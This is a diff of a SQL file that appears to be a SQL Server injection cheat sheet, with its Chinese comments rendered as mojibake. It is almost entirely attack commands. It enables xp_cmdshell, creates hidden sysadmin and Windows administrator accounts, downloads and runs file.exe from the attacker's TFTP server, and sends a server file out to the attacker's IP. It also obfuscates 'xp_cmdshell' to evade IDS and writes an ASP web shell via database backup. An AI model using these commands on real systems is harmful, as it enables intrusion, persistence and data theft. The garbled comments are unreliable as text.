@@ -14,48 +14,48 @@ EXEC sp_configure 'xp_cmdshell', 1
 GO 
 RECONFIGURE
 GO
-exec master.dbo.sp_addlogin test,test;					-- //Ìí¼ÓÊı¾İ¿âÓÃ»§ÓÃ»§test,ÃÜÂëÎªtest
-exec master.dbo.sp_password test,123456,test;			-- //Èç¹ûÏë¸ÄÃÜÂë£¬ÔòÓÃÕâ¾ä£¨½«testµÄÃÜÂë¸ÄÎª123456£©
-exec master.dbo.sp_addsrvrolemember test,sysadmin;		-- //½«test¼Óµ½sysadmin×é,Õâ¸ö×éµÄ³ÉÔ±¿ÉÖ´ĞĞÈÎºÎ²Ù×÷
-exec master.dbo.xp_cmdshell 'net user test test /add';	-- //Ìí¼ÓÏµÍ³ÓÃ»§test,ÃÜÂëÎªtest
-exec master.dbo.xp_cmdshell 'net localgroup administrators test /add';-- //½«ÏµÍ³ÓÃ»§testÌáÉıÎª¹ÜÀíÔ±
+exec master.dbo.sp_addlogin test,test;					-- //æ·»åŠ æ•°æ®åº“ç”¨æˆ·ç”¨æˆ·test,å¯†ç ä¸ºtest
+exec master.dbo.sp_password test,123456,test;			-- //å¦‚æœæƒ³æ”¹å¯†ç ï¼Œåˆ™ç”¨è¿™å¥ï¼ˆå°†testçš„å¯†ç æ”¹ä¸º123456ï¼‰
+exec master.dbo.sp_addsrvrolemember test,sysadmin;		-- //å°†teståŠ åˆ°sysadminç»„,è¿™ä¸ªç»„çš„æˆå‘˜å¯æ‰§è¡Œä»»ä½•æ“ä½œ
+exec master.dbo.xp_cmdshell 'net user test test /add';	-- //æ·»åŠ ç³»ç»Ÿç”¨æˆ·test,å¯†ç ä¸ºtest
+exec master.dbo.xp_cmdshell 'net localgroup administrators test /add';-- //å°†ç³»ç»Ÿç”¨æˆ·testæå‡ä¸ºç®¡ç†å‘˜
 
 
---Í¨¹ıSQLSERVER×¢ÈëÂ©¶´½¨Êı¾İ¿â¹ÜÀíÔ±ÕÊºÅºÍÏµÍ³¹ÜÀíÔ±ÕÊºÅ[µ±Ç°ÕÊºÅ±ØĞëÊÇSYSADMIN×é]
+--é€šè¿‡SQLSERVERæ³¨å…¥æ¼æ´å»ºæ•°æ®åº“ç®¡ç†å‘˜å¸å·å’Œç³»ç»Ÿç®¡ç†å‘˜å¸å·[å½“å‰å¸å·å¿…é¡»æ˜¯SYSADMINç»„]
  
 
---ÕâÑù£¬ÄãÔÚËûµÄÊı¾İ¿âºÍÏµÍ³ÄÚ¶¼ÁôÏÂÁËtest¹ÜÀíÔ±ÕËºÅÁË
+--è¿™æ ·ï¼Œä½ åœ¨ä»–çš„æ•°æ®åº“å’Œç³»ç»Ÿå†…éƒ½ç•™ä¸‹äº†testç®¡ç†å‘˜è´¦å·äº†
 
 
---ÏÂÃæÊÇÈçºÎ´ÓÄãµÄ·şÆ÷ÏÂÔØÎÄ¼şfile.exeºóÔËĞĞËü[Ç°ÌáÊÇÄã±ØĞë½«ÄãµÄµçÄÔÉèÎªTFTP·şÎñÆ÷£¬½«69¶Ë¿Ú´ò¿ª]
+--ä¸‹é¢æ˜¯å¦‚ä½•ä»ä½ çš„æœå™¨ä¸‹è½½æ–‡ä»¶file.exeåè¿è¡Œå®ƒ[å‰ææ˜¯ä½ å¿…é¡»å°†ä½ çš„ç”µè„‘è®¾ä¸ºTFTPæœåŠ¡å™¨ï¼Œå°†69ç«¯å£æ‰“å¼€]
 
 
-exec master.dbo.xp_cmdshell 'tftp ¨Ci 192.168 get file.exe';--
+exec master.dbo.xp_cmdshell 'tftp â€“i 192.168 get file.exe';--
 
 
---È»ºóÔËĞĞÕâ¸öÎÄ¼ş£º
+--ç„¶åè¿è¡Œè¿™ä¸ªæ–‡ä»¶ï¼š
 exec master.dbo.xp_cmdshell 'file.exe';--
 
 
---ÏÂÔØ·şÎñÆ÷µÄÎÄ¼şfile2.docµ½±¾µØTFTP·şÎñÆ÷[ÎÄ¼ş±ØĞë´æÔÚ]:
+--ä¸‹è½½æœåŠ¡å™¨çš„æ–‡ä»¶file2.docåˆ°æœ¬åœ°TFTPæœåŠ¡å™¨[æ–‡ä»¶å¿…é¡»å­˜åœ¨]:
 
 
-exec master.dbo.xp_cmdshell 'tftp ¨Ci ÄãµÄIP Put file2.doc';--
+exec master.dbo.xp_cmdshell 'tftp â€“i ä½ çš„IP Put file2.doc';--
 
 
---ÈÆ¹ıIDSµÄ¼ì²â[Ê¹ÓÃ±äÁ¿]
+--ç»•è¿‡IDSçš„æ£€æµ‹[ä½¿ç”¨å˜é‡]
 declare @a sysname set @a='xp_'+'cmdshell' exec @a 'dir c:\'
 declare @a sysname set @a='xp'+'_cm'+'dshell' exec @a 'dir c:\' 
 
 
---ĞÂ¼ÓµÄ£º
+--æ–°åŠ çš„ï¼š
 
 
---½¨Ò»¸ö±í¡£Ö»ÓĞÒ»¸ö×Ö¶Î£¬ÀàĞÍÎªimage,½«aspÄÚÈİĞ´Èë¡£µ¼³öÊı¾İ¿âÎªÎÄ¼ş
+--å»ºä¸€ä¸ªè¡¨ã€‚åªæœ‰ä¸€ä¸ªå­—æ®µï¼Œç±»å‹ä¸ºimage,å°†aspå†…å®¹å†™å…¥ã€‚å¯¼å‡ºæ•°æ®åº“ä¸ºæ–‡ä»¶
 backup database dbname to disk='d:\web\db.asp'; 
 
 
---±¨´íµÃµ½ÏµÍ³²Ù×÷ÏµÍ³ºÍÊı¾İ¿âÏµÍ³°æ±¾ºÅ
+--æŠ¥é”™å¾—åˆ°ç³»ç»Ÿæ“ä½œç³»ç»Ÿå’Œæ•°æ®åº“ç³»ç»Ÿç‰ˆæœ¬å·
 (select @@VERSION);
 
 
